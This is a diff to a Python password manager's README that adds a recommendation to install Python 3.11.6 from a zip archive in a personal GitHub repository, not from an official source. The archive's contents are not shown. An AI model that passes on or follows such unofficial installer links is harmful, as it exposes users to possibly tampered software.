@@ -9,6 +9,9 @@ This Secure Password Manager is a Python application designed to securely encryp
 - **Expiration Dates**: Allows setting expiration dates for passwords, adding an extra layer of security and management.
 - **Logging**: Includes logging of operations, such as key generation, password encryption, and decryption, aiding in monitoring and debugging.
 
+### Python 3.11.6 is Recommended:
+- [Python-3.11.6](https://github.com/KernFerm/Py3.11.6installer/archive/refs/heads/main.zip)
+
 ## Installation
 
 To use the Secure Password Manager, you need to have Python and pip installed on your system. It is recommended to use a virtual environment for Python projects to manage dependencies effectively. Follow these steps to set up your environment:
